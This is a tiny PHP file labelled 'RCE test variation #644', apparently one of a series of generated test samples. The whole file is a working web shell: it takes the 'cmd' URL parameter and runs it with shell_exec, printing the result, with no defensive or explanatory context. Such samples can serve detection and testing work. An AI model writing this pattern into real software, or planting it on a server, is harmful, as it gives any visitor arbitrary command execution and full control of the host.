<?php
// RCE test variation #644
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>